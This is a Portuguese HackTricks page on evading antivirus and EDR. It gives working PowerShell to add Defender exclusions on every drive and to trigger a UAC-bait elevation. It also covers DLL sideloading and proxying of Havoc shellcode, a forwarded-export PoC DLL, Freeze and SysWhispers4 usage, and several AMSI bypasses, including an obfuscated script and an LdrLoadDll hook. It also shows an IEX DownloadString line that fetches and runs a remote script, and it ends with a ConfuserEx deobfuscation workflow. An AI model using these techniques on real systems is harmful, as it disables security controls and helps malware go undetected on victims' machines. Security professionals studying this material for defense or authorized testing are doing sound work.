# Contorno de AV

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita originalmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender, fingindo ser outro AV.
- [Desativar o Defender se você for admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo de instalador antes de adulterar o Defender

Loaders públicos disfarçados de cheats de jogos frequentemente vêm como instaladores Node.js/Nexe não assinados, que primeiro **pedem ao usuário para elevar os privilégios** e só então neutralizam o Defender. O fluxo é simples:

1. Verifique se há contexto administrativo com `net session`. O comando só é bem-sucedido quando o usuário tem direitos de admin; portanto, uma falha indica que o loader está sendo executado como usuário padrão.
2. Reinicie-se imediatamente com o verbo `RunAs` para acionar o prompt de consentimento UAC esperado, preservando a linha de comando original.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

As vítimas já acreditam que estão instalando software “crackeado”, então geralmente aceitam o prompt, dando ao malware as permissões necessárias para alterar a política do Defender.<sup>[[26]](#references)</sup>

### Exclusões abrangentes de `MpPreference` para todas as letras de unidade

Depois de obter privilégios elevados, cadeias no estilo GachiLoader ampliam ao máximo os pontos cegos do Defender, em vez de desativar o serviço por completo. Primeiro, o loader encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e, em seguida, adiciona **exclusões extremamente abrangentes**, tornando impossível verificar todos os perfis de usuário, diretórios do sistema e discos removíveis:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, pendrives USB etc.), então **qualquer payload futuro colocado em qualquer lugar do disco será ignorado**.
- A exclusão da extensão `.sys` é preventiva: os atacantes reservam a opção de carregar drivers não assinados posteriormente, sem precisar mexer novamente no Defender.
- Todas as alterações ficam em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que etapas posteriores confirmem que as exclusões persistem ou as expandam sem disparar novamente o UAC.

Como nenhum serviço do Defender é interrompido, verificações de integridade simplistas continuam informando que o “antivírus está ativo”, embora a inspeção em tempo real nunca examine esses caminhos.<sup>[[26]](#references)</sup>

## **Metodologia de AV Evasion**

Atualmente, os AVs usam métodos diferentes para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, nos EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita sinalizando strings maliciosas conhecidas ou sequências de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum etc.). Isso significa que o uso de ferramentas públicas conhecidas pode fazer com que você seja detectado mais facilmente, pois elas provavelmente já foram analisadas e sinalizadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, o AV não terá como detectar seu programa, mas será necessário algum tipo de loader para descriptografar e executar o programa na memória.

- **Ofuscação**

Às vezes, basta alterar algumas strings no binário ou script para que ele passe pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

- **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa maneira de verificar a detecção estática do Windows Defender é usar o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele divide o arquivo em vários segmentos e solicita ao Defender que examine cada um individualmente. Assim, é possível identificar exatamente quais strings ou bytes do binário foram sinalizados.

Recomendo muito conferir esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### Testes offline de recursos PE para classificadores estáticos

Bytes de payload compactados ou criptografados são apenas uma das entradas de um classificador estático. O EMBER2024 extrai recursos PE, incluindo imports, exports, seções, cabeçalhos e dados Authenticode.<sup>[[48]](#references)</sup> Em um experimento com um loader, adicionar 141 imports com aparência benigna reduziu em 93% a pontuação de atividade maliciosa do EMBER2024, enquanto imports associados a malware a elevaram. Esse resultado se aplica àquele modelo e àquelas amostras; não é uma forma confiável de contornar um produto AV/EDR específico.<sup>[[50]](#references)</sup>

Para um teste autorizado de loader, mantenha o payload e o caminho de execução constantes, altere uma variável de build pretendida por variante e compare as pontuações offline. Inspecione os recursos PE resultantes, pois uma alteração de build pode afetar mais de um grupo de recursos.<sup>[[49]](#references)[[50]](#references)</sup> Para manter os imports pretendidos na IAT, chame as APIs Win32 escolhidas a partir de código alcançável. Varie a seleção e distribua os pontos de chamada entre os builds, em vez de criar uma função fixa de camuflagem que possa se tornar uma assinatura. O experimento também relatou pontuações menores com assinatura de código válida, entradas de export e mais funções que aumentam `.pdata`; assinaturas inválidas tiveram pouco efeito, e o efeito de `.pdata` foi pequeno.<sup>[[50]](#references)</sup>

O pacote `thrember` fornece extração de recursos e modelos de benchmark. Após instalá-lo, use `thrember.download_models("models")` com um diretório `models` existente e, em seguida, execute o scorer a partir do diretório pai: a função auxiliar de download altera o diretório de trabalho atual. O classificador PE pode calcular a pontuação de um diretório de builds sem enviá-los a um serviço de varredura:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Mantenha fixas as versões do modelo e do extrator de recursos durante a comparação. Uma pontuação offline mais baixa mostra apenas como esse classificador reage ao binário alterado; não comprova evasão da análise comportamental, da emulação ou de um modelo diferente de um fornecedor.<sup>[[49]](#references)[[50]](#references)</sup> Para [polimorfismo por build e camuflagem do binário externo em payloads virtualizados](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consulte o modelo de execução separado.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do navegador, fazer um minidump do LSASS etc.). Essa parte pode ser um pouco mais complicada, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Aguardar antes da execução** Dependendo de como isso é implementado, pode ser uma ótima maneira de burlar a análise dinâmica do AV. Os AVs têm muito pouco tempo para verificar arquivos sem interromper o fluxo de trabalho do usuário, então pausas longas podem atrapalhar a análise de binários. O problema é que muitas sandboxes de AV podem simplesmente ignorar a pausa, dependendo de como ela é implementada.
- **Verificar os recursos da máquina** Geralmente, as sandboxes têm poucos recursos disponíveis (por exemplo, < 2 GB de RAM); caso contrário, poderiam deixar a máquina do usuário lenta. Você também pode ser bastante criativo: por exemplo, verificando a temperatura da CPU ou até a velocidade das ventoinhas. Nem tudo será implementado na sandbox.
- **Verificações específicas da máquina** Se quiser atingir um usuário cuja estação de trabalho esteja conectada ao domínio "contoso.local", você pode verificar o domínio do computador para ver se corresponde ao que especificou. Se não corresponder, seu programa pode ser encerrado.

Acontece que o nome do computador da sandbox do Microsoft Defender é HAL9TH. Portanto, você pode verificar o nome do computador no malware antes da detonação. Se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do Defender, então pode encerrar o programa.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras ótimas dicas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como já dissemos nesta publicação, **ferramentas públicas** acabarão sendo **detectadas**, então você deve se perguntar:

Por exemplo, se quiser fazer dump do LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar outro projeto menos conhecido que também faz dump do LSASS?

A resposta certa provavelmente é a segunda opção. Tomando o mimikatz como exemplo, ele provavelmente é uma das ferramentas — se não a ferramenta — mais sinalizadas pelos AVs e EDRs. Embora o projeto em si seja muito legal, também é um pesadelo contornar AVs com ele. Portanto, basta procurar alternativas para o que você está tentando fazer.

> [!TIP]
> Ao modificar seus payloads para evasão, lembre-se de **desativar o envio automático de amostras** no Defender e, por favor, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo for obter evasão a longo prazo. Se quiser verificar se um AV específico detecta seu payload, instale-o em uma VM, tente desativar o envio automático de amostras e teste-o lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**. Na minha experiência, arquivos DLL geralmente são **bem menos detectados** e analisados, então esse é um truque muito simples para evitar a detecção em alguns casos (se seu payload puder ser executado como DLL, é claro).

Como podemos ver nesta imagem, um payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me entre um payload EXE normal do Havoc e uma DLL normal do Havoc</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ficar muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo loader, posicionando o aplicativo vítima e os payloads maliciosos lado a lado.

Você pode procurar programas suscetíveis a DLL Sideloading usando o [Siofra](https://github.com/Cybereason/siofra) e o seguinte script de PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo muito que você **explore por conta própria programas vulneráveis a DLL Hijack/Sideload**, pois essa técnica é bastante furtiva quando executada corretamente. Porém, se você usar programas conhecidos publicamente por serem vulneráveis a DLL Sideload, poderá ser detectado facilmente.

Apenas colocar uma DLL maliciosa com o nome de uma DLL que o programa espera carregar não fará com que seu payload seja carregado, pois o programa espera encontrar funções específicas dentro dessa DLL. Para corrigir esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo executar seu payload.

Usarei o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Estas são as etapas que segui:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

O último comando nos fornecerá 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu diria que isso foi um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista ao VOD da S3cur3Th1sSh1t no [Twitch](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para saber mais sobre o que discutimos, em mais detalhes.

### Abusando de Forwarded Exports (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que, na verdade, são "forwarders": em vez de apontar para código, a entrada de exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um caller resolve a exportação, o loader do Windows:

- Carrega `TargetDll`, caso ainda não esteja carregada
- Resolve `TargetFunc` a partir dela

Comportamentos importantes a entender:
- Se `TargetDll` for uma KnownDLL, ela será fornecida pelo namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` não for uma KnownDLL, será usada a ordem normal de pesquisa de DLLs, que inclui o diretório do módulo que está fazendo a resolução do forward.

Isso possibilita uma primitiva indireta de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um módulo cujo nome não seja KnownDLL e coloque essa DLL assinada junto a uma DLL controlada pelo atacante, com o nome exato do módulo de destino encaminhado. Quando a exportação encaminhada for invocada, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.<sup>[[13]](#references)</sup>

Exemplo observado no Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` não é uma KnownDLL, então é resolvida pela ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta com permissão de escrita
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Uma `DllMain` mínima é suficiente para executar código; não é necessário implementar a função encaminhada para acionar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Acione o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento observado:
- rundll32 (assinado) carrega a `keyiso.dll` side-by-side (assinada)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o encaminhamento para `NCRYPTPROV.SetAuditingInterface`
- Em seguida, o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro de "API ausente" somente depois que `DllMain` já tiver sido executada

Dicas para hunting:
- Concentre-se em exports encaminhados cujo módulo de destino não seja um KnownDLL. Os KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar exports encaminhados com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos que não sejam do sistema, seguidos pelo carregamento de DLLs que não sejam KnownDLLs, com o mesmo nome-base, desse diretório
- Gere alertas para cadeias de processos/módulos como: `rundll32.exe` → `keyiso.dll` fora de diretórios do sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e impeça gravação e execução nos diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um toolkit de payloads para contornar EDRs usando processos suspensos, syscalls diretas e métodos alternativos de execução`

Você pode usar o Freeze para carregar e executar seu shellcode de forma furtiva.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato: o que funciona hoje pode ser detectado amanhã. Portanto, nunca dependa de apenas uma ferramenta; se possível, tente encadear várias técnicas de evasion.

## Syscalls diretas/indiretas e resolução de SSN (SysWhispers4)

EDRs costumam instalar **hooks inline em user-mode** nos stubs de syscall de `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **diretos** ou **indiretos** que carregam o **SSN** (System Service Number) correto e fazem a transição para o kernel mode sem executar o entrypoint exportado que contém o hook.<sup>[[32]](#references)</sup>

**Opções de invocação:**
- **Direta (incorporada)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (não acessa exports de `ntdll`).
- **Indireta**: salta para um gadget `syscall` existente dentro de `ntdll`, fazendo com que a transição para o kernel pareça ter origem em `ntdll` (útil para evasion heurística); a opção **indireta aleatória** seleciona um gadget de um conjunto a cada chamada.
- **Egg-hunt**: evita incorporar a sequência de opcode estática `0F 05` no disco; resolve uma sequência de syscall em tempo de execução.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (ordenação por VA)**: infere SSNs ordenando os stubs de syscall por endereço virtual, em vez de ler os bytes dos stubs.
- **SyscallsFromDisk**: mapeia um `\KnownDlls\ntdll.dll` limpo, lê os SSNs de seu `.text` e, em seguida, desfaz o mapeamento (contorna todos os hooks na memória).
- **RecycledGate**: combina a inferência de SSN por ordenação de VA com a validação de opcodes quando um stub está limpo; se houver um hook, recorre à inferência por VA.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em tempo de execução, sem analisar bytes com hooks.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Interface de Verificação Antimalware)

O AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de verificar **arquivos no disco**; portanto, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir isso, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado aos seguintes componentes do Windows.

- Controle de Conta de Usuário, ou UAC (elevação de EXE, COM, MSI ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Ele permite que soluções antivírus inspecionem o comportamento de scripts, expondo o conteúdo deles em um formato não criptografado e não ofuscado.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` gera o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho do executável a partir do qual o script foi executado — neste caso, powershell.exe.

Não gravamos nenhum arquivo no disco, mas ainda assim fomos detectados na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também é executado pelo AMSI. Isso afeta inclusive `Assembly.Load(byte[])`, usado para carregar código e executá-lo na memória. Por isso, é recomendável usar versões mais antigas do .NET (como a 4.7.2 ou anteriores) para execução na memória, caso você queira evitar o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI consegue desofuscar scripts mesmo que tenham várias camadas; portanto, a obfuscação pode ser uma opção ruim, dependendo de como for feita. Isso torna a evasão menos simples. Às vezes, porém, basta alterar alguns nomes de variáveis para contornar a detecção; isso depende de quanto do conteúdo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do PowerShell (e também no cscript.exe, wscript.exe etc.), é possível adulterá-lo facilmente, mesmo executando como usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçar um erro**

Forçar a falha da inicialização do AMSI (amsiInitFailed) fará com que nenhuma verificação seja iniciada no processo atual. Isso foi divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation), e a Microsoft desenvolveu uma assinatura para impedir seu uso mais amplo.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bastou uma linha de código PowerShell para tornar o AMSI inutilizável no processo atual do PowerShell. Essa linha foi, é claro, sinalizada pelo próprio AMSI, então é necessário modificá-la para usar essa técnica.

Aqui está um bypass de AMSI modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, this will probably get flagged once this post comes out, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

Essa técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por verificar a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código de E_INVALIDARG. Dessa forma, o resultado da verificação real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Há também muitas outras técnicas usadas para contornar o AMSI com powershell. Confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando o AMSI ao impedir o carregamento de amsi.dll (hook de LdrLoadDll)

O AMSI é inicializado somente após o carregamento de `amsi.dll` no processo atual. Um bypass robusto e independente da linguagem consiste em instalar um hook em modo de usuário em `ntdll!LdrLoadDll`, que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhuma verificação é realizada nesse processo.<sup>[[23]](#references)</sup>

Visão geral da implementação (pseudocódigo em C/C++ para x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona com PowerShell, WScript/CScript e loaders personalizados (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Já foi visto em uso por loaders executados por meio de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera scripts para contornar o AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera scripts para contornar o AMSI e evitar detecções por assinatura usando funções definidas pelo usuário com nomes aleatórios, variáveis e expressões de caracteres, além de aplicar aleatoriamente diferentes combinações de maiúsculas e minúsculas às palavras-chave do PowerShell.

**Remover a assinatura detectada**

Você pode usar ferramentas como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover da memória do processo atual a assinatura do AMSI detectada. Essas ferramentas funcionam examinando a memória do processo atual em busca da assinatura do AMSI e, em seguida, sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar a versão 2 do PowerShell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você poderá executar seus scripts sem que sejam verificados pelo AMSI. Você pode fazer isso:

```bash
powershell.exe -version 2
```

## Registro do PowerShell

O registro do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para invasores que querem evitar a detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Desativar PowerShell Transcription e Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para isso.
- **Usar a versão 2 do PowerShell**: Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você poderá executar seus scripts sem que sejam analisados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Usar uma sessão PowerShell não gerenciada**: Use [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para hospedar o PowerShell sem iniciar `powershell.exe` (a abordagem usada pelo `powerpick` do Cobalt Strike). Isso evita controles vinculados especificamente ao processo `powershell.exe`, mas não desativa por si só o AMSI, o Script Block Logging ou todas as outras defesas do PowerShell; a cobertura depende do runtime e da implementação do host.

## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem da criptografia de dados, o que aumenta a entropia do binário e facilita sua detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Desofuscando binários .NET protegidos pelo ConfuserEx

Ao analisar malware que usa o ConfuserEx 2 (ou forks comerciais), é comum encontrar várias camadas de proteção que bloqueiam decompiladores e sandboxes. O fluxo de trabalho abaixo **restaura de forma confiável um IL quase original**, que depois pode ser decompilado para C# em ferramentas como dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Remoção do anti-tampering – O ConfuserEx criptografa cada *corpo de método* e o descriptografa dentro do construtor estático do *módulo* (`<Module>.cctor`). Ele também altera o checksum do PE, de modo que qualquer modificação fará o binário falhar. Use o **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`), que podem ser úteis ao criar seu próprio unpacker.

2.  Recuperação de símbolos / fluxo de controle – forneça o arquivo *clean* ao **de4dot-cex** (um fork do de4dot compatível com ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Sinalizadores:
     • `-p crx` – seleciona o perfil ConfuserEx 2
     • de4dot desfaz o achatamento do fluxo de controle, restaura os namespaces, as classes e os nomes de variáveis originais e descriptografa strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas de métodos por wrappers leves (também chamados de *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Após esta etapa, você deverá observar APIs .NET normais, como `Convert.FromBase64String` ou `AES.Create()`, em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy e procure grandes blobs Base64 ou o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Muitas vezes, o malware o armazena como um array de bytes codificado em TLV, inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – útil ao trabalhar em uma estação de trabalho offline.

